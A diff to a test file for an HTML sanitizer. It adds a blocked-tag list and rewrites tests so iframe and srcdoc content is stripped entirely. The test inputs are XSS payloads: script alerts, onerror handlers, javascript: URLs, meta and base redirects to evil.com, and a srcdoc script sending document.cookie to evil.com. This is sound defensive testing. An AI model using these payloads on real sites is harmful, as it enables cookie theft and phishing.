@@ -112,6 +112,115 @@ describe("sanitizeHTMLWithConfig", () => {
 		});
 	});
 
+	describe("Blocked Tags — WCH-SI10-001 hardening", () => {
+		const blockedTags = [
+			"iframe",
+			"object",
+			"embed",
+			"applet",
+			"frame",
+			"frameset",
+			"noframes",
+			"meta",
+			"base",
+			"link",
+			"style",
+			"form",
+		];
+
+		for (const tag of blockedTags) {
+			test(`strips <${tag}> elements`, () => {
+				const input = `<${tag}>content</${tag}>`;
+				const result = sanitizeHTMLWithConfig(input, undefined);
+				expect(result).not.toMatch(new RegExp(`<${tag}[\\s>/]`, "i"));
+			});
+		}
+
+		test("preserves text outside blocked tags", () => {
+			const input = 'Before <form action="/steal">form content</form> After';
+			const result = sanitizeHTMLWithConfig(input, undefined);
+			expect(result).toContain("Before");
+			expect(result).toContain("After");
+			expect(result).not.toContain("<form");
+		});
+
+		test("strips iframe including srcdoc attribute entirely", () => {
+			const input = '<iframe srcdoc="<h1>content</h1>"></iframe>';
+			const result = sanitizeHTMLWithConfig(input, undefined);
+			expect(result).not.toContain("iframe");
+			expect(result).not.toContain("srcdoc");
+		});
+
+		test("strips style elements to prevent CSS injection", () => {
+			const input = "<style>body { background: url(javascript:alert(1)) }</style><p>safe</p>";
+			const result = sanitizeHTMLWithConfig(input, undefined);
+			expect(result).not.toContain("<style");
+			expect(result).not.toContain("javascript:");
+			expect(result).toContain("<p>safe</p>");
+		});
+
+		test("strips base tag that would rewrite page URLs", () => {
+			const input = '<base href="https://evil.com/"><a href="/path">link</a>';
+			const result = sanitizeHTMLWithConfig(input, undefined);
+			expect(result).not.toContain("<base");
+			expect(result).toContain("<a");
+		});
+
+		test("strips meta redirect", () => {
+			const input = '<meta http-equiv="refresh" content="0;url=https://evil.com">';
+			const result = sanitizeHTMLWithConfig(input, undefined);
+			expect(result).not.toContain("<meta");
+		});
+	});
+
+	describe("ALWAYS_BLOCKED_TAGS filter for customAllowedHtmlTags", () => {
+		test("strips blocked tags from custom allowed list", () => {
+			const input = "<iframe>malicious</iframe><b>safe</b>";
+			const result = sanitizeHTMLWithConfig(input, ["iframe", "b"]);
+			expect(result).not.toContain("iframe");
+			expect(result).toContain("<b>safe</b>");
+		});
+
+		test("strips script from custom allowed list", () => {
+			const input = "<script>alert(1)</script><span>safe</span>";
+			const result = sanitizeHTMLWithConfig(input, ["script", "span"]);
+			expect(result).not.toContain("<script");
+			expect(result).toContain("<span>safe</span>");
+		});
+
+		test("trims whitespace from tag names in custom list", () => {
+			const input = "<iframe>malicious</iframe><b>safe</b>";
+			// " iframe " with surrounding spaces should still be blocked
+			const result = sanitizeHTMLWithConfig(input, [" iframe ", "b"]);
+			expect(result).not.toContain("iframe");
+			expect(result).toContain("<b>safe</b>");
+		});
+
+		test("handles non-string items in custom allowed list gracefully", () => {
+			const input = "<b>bold</b>";
+			// @ts-expect-error testing invalid runtime input
+			const result = sanitizeHTMLWithConfig(input, ["b", null, 42, {}]);
+			expect(result).toContain("<b>bold</b>");
+		});
+
+		test("handles non-array customAllowedHtmlTags gracefully", () => {
+			const input = "<b>bold</b>";
+			// @ts-expect-error testing invalid runtime input — falls back to default config
+			const result = sanitizeHTMLWithConfig(input, "b");
+			expect(result).toContain("<b>bold</b>");
+		});
+
+		test("handles empty custom allowed list", () => {
+			const input = "<b>bold</b><i>italic</i>";
+			const result = sanitizeHTMLWithConfig(input, []);
+			// Empty list means no tags allowed — all stripped
+			expect(result).not.toContain("<b>");
+			expect(result).not.toContain("<i>");
+			expect(result).toContain("bold");
+			expect(result).toContain("italic");
+		});
+	});
+
 	describe("Custom Allowed Tags", () => {
 		test("respects custom allowed tags", () => {
 			const input = "<div>div content</div><span>span content</span>";
@@ -268,122 +377,61 @@ describe("sanitizeHTMLWithConfig", () => {
 		});
 	});
 
-	describe("iframe srcdoc XSS Prevention (Zendesk Infosec Report)", () => {
-		test("removes script tags from iframe srcdoc attribute", () => {
+	describe("iframe srcdoc XSS Prevention", () => {
+		// iframe is now removed from ALLOWED_TAGS (WCH-SI10-001). All iframe elements
+		// are stripped entirely by DOMPurify, so srcdoc content is never rendered.
+		// The tests below confirm iframe and srcdoc are fully removed.
+
+		test("strips iframe element and srcdoc containing script", () => {
 			const input =
 				'<iframe srcdoc="<script>alert(parent.document.domain)</script>"></iframe>';
 			const result = sanitizeHTMLWithConfig(input, undefined);
-			// The srcdoc content must not contain executable script tags
-			expect(result).not.toMatch(/srcdoc\s*=\s*["'][^"']*<script[^>]*>/i);
-			// If srcdoc is kept, its content must be sanitized; or srcdoc should be removed entirely
-			if (result.includes("srcdoc")) {
-				expect(result).not.toContain("alert(");
-				expect(result).not.toMatch(/<script/i);
-			}
+			expect(result).not.toContain("iframe");
+			expect(result).not.toContain("srcdoc");
+			expect(result).not.toContain("alert(");
 		});
 
-		test("removes script tags from iframe srcdoc with HTML-encoded payload", () => {
-			// This is the exact payload from the security report (HTML-encoded angle brackets in srcdoc)
+		test("strips iframe with HTML-encoded srcdoc payload", () => {
 			const input =
 				'341 TestTest <iframe srcdoc="&lt;script&gt;alert(parent.document.domain)&lt;/script&gt;"></iframe> TestTest';
 			const result = sanitizeHTMLWithConfig(input, undefined);
-			expect(result).not.toMatch(/srcdoc\s*=\s*["'][^"']*<script[^>]*>/i);
-			if (result.includes("srcdoc")) {
-				expect(result).not.toContain("alert(");
-				expect(result).not.toMatch(/<script/i);
-			}
+			expect(result).not.toContain("iframe");
+			expect(result).not.toContain("srcdoc");
+			expect(result).not.toContain("alert(");
+			// Text outside the iframe is preserved
 			expect(result).toContain("341 TestTest");
 			expect(result).toContain("TestTest");
 		});
 
-		test("prevents executable code in phishing iframe srcdoc", () => {
-			// Phishing payload combined with script execution from the security report
-			const input = `<iframe srcdoc="<script>document.location='https://evil.com/?c='+document.cookie</script>⚠️<div style='font-size:22px;'>Ihre Sitzung ist abgelaufen</div>"></iframe>`;
+		test("strips phishing iframe with script payload", () => {
+			const input = `<iframe srcdoc="<script>document.location='https://evil.com/?c='+document.cookie</script>⚠️<div>Ihre Sitzung ist abgelaufen</div>"></iframe>`;
 			const result = sanitizeHTMLWithConfig(input, undefined);
-			// The srcdoc content must have scripts removed even when mixed with phishing HTML
-			expect(result).not.toMatch(/<script/i);
+			expect(result).not.toContain("iframe");
+			expect(result).not.toContain("srcdoc");
 			expect(result).not.toContain("document.location");
 			expect(result).not.toContain("document.cookie");
-			// Benign styled divs are allowed by the sanitizer config (not an XSS vector),
-			// but any executable payload must be stripped
-			if (result.includes("srcdoc")) {
-				expect(result).toContain("Ihre Sitzung ist abgelaufen");
-			}
 		});
 
-		test("removes event handlers from iframe srcdoc content", () => {
+		test("strips iframe with event handler in srcdoc", () => {
 			const input = '<iframe srcdoc="<img src=x onerror=alert(1)>"></iframe>';
 			const result = sanitizeHTMLWithConfig(input, undefined);
-			expect(result).not.toMatch(/onerror/i);
+			expect(result).not.toContain("iframe");
+			expect(result).not.toContain("onerror");
 		});
 
-		test("removes iframe srcdoc with nested iframe payload", () => {
+		test("strips nested iframe payload", () => {
 			const input = '<iframe srcdoc="<iframe src=javascript:alert(1)></iframe>"></iframe>';
 			const result = sanitizeHTMLWithConfig(input, undefined);
-			expect(result).not.toMatch(/javascript:/i);
+			expect(result).not.toContain("iframe");
+			expect(result).not.toContain("javascript:");
 		});
 
-		test("preserves valid HTML content in iframe srcdoc", () => {
+		test("strips iframe even with valid srcdoc content", () => {
 			const input =
 				'<iframe srcdoc="<h1>Welcome</h1><p>This is <b>valid</b> content.</p>"></iframe>';
 			const result = sanitizeHTMLWithConfig(input, undefined);
-			expect(result).toContain("srcdoc");
-			expect(result).toContain("Welcome");
-			expect(result).toContain("This is");
-			expect(result).toContain("<b>valid</b>");
-			expect(result).toContain("content.");
-		});
-
-		test("preserves styled content in iframe srcdoc", () => {
-			const input = "<iframe srcdoc=\"<div style='color:red;'>Styled text</div>\"></iframe>";
-			const result = sanitizeHTMLWithConfig(input, undefined);
-			expect(result).toContain("srcdoc");
-			expect(result).toContain("Styled text");
-		});
-
-		test("preserves links in iframe srcdoc", () => {
-			const input =
-				"<iframe srcdoc=\"<a href='https://example.com'>Click here</a>\"></iframe>";
-			const result = sanitizeHTMLWithConfig(input, undefined);
-			expect(result).toContain("srcdoc");
-			expect(result).toContain("Click here");
-			expect(result).toContain("https://example.com");
-		});
-
-		test("preserves images with safe src in iframe srcdoc", () => {
-			const input =
-				"<iframe srcdoc=\"<img src='https://example.com/image.png' alt='photo'>\"></iframe>";
-			const result = sanitizeHTMLWithConfig(input, undefined);
-			expect(result).toContain("srcdoc");
-			expect(result).toContain("https://example.com/image.png");
-		});
-
-		test("preserves lists and tables in iframe srcdoc", () => {
-			const input =
-				'<iframe srcdoc="<ul><li>Item 1</li><li>Item 2</li></ul><table><tr><td>Cell</td></tr></table>"></iframe>';
-			const result = sanitizeHTMLWithConfig(input, undefined);
-			expect(result).toContain("srcdoc");
-			expect(result).toContain("Item 1");
-			expect(result).toContain("Item 2");
-			expect(result).toContain("Cell");
-		});
-
-		test("preserves plain text in iframe srcdoc", () => {
-			const input = '<iframe srcdoc="Hello, this is just plain text."></iframe>';
-			const result = sanitizeHTMLWithConfig(input, undefined);
-			expect(result).toContain("srcdoc");
-			expect(result).toContain("Hello, this is just plain text.");
-		});
-
-		test("preserves valid content while stripping dangerous parts in mixed srcdoc", () => {
-			const input =
-				'<iframe srcdoc="<h1>Title</h1><script>alert(1)</script><p>Safe paragraph</p>"></iframe>';
-			const result = sanitizeHTMLWithConfig(input, undefined);
-			expect(result).toContain("srcdoc");
-			expect(result).toContain("Title");
-			expect(result).toContain("Safe paragraph");
-			expect(result).not.toMatch(/<script/i);
-			expect(result).not.toContain("alert(1)");
+			expect(result).not.toContain("iframe");
+			expect(result).not.toContain("srcdoc");
 		});
 
 		test("srcdoc sanitization result is stable (idempotent)", () => {
@@ -404,24 +452,18 @@ describe("sanitizeHTMLWithConfig", () => {
 		test("handles iterative bypass attacks within srcdoc attributes", () => {
 			const input = '<iframe srcdoc="<<script>script>alert(1)<</script>/script>"></iframe>';
 			const result = sanitizeHTMLWithConfig(input, undefined);
-			// Obfuscated/nested tags inside srcdoc must not produce valid script tags
 			expect(result).not.toMatch(/<script[^>]*>/i);
 			expect(result).not.toContain("alert(1)");
-			// Result must be stable across passes
 			const secondPass = sanitizeHTMLWithConfig(result, undefined);
 			expect(result).toBe(secondPass);
 		});
 
-		test("removes executable code from nested srcdoc attributes", () => {
+		test("strips nested srcdoc iframe payload entirely", () => {
 			const input = `<iframe srcdoc="<iframe srcdoc='<script>alert(1)</script>'></iframe>"></iframe>`;
 			const result = sanitizeHTMLWithConfig(input, undefined);
-			// No script tags should remain anywhere in the output
+			expect(result).not.toContain("iframe");
 			expect(result).not.toMatch(/<script/i);
 			expect(result).not.toContain("alert(1)");
-			if (result.includes("srcdoc")) {
-				// If any srcdoc attributes remain, their content must not contain scripts
-				expect(result).not.toMatch(/srcdoc\s*=\s*["'][^"']*<script[^>]*>/i);
-			}
 		});
 	});
 });
